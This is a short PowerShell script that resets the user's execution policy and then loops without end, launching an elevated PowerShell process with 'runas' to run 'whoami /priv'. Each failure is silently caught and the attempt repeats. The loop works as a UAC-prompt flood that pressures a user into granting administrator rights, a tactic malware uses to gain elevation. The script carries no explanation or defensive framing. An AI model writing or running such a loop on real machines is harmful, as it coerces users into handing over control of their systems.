Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
$command = "C:\Windows\System32\cmd.exe"
while($true)
 {
	 try
  {  
    Start-Process 'powershell' -Verb runas -ArgumentList '-noexit -c whoami /priv';exit
     
	}
    catch{}   
}
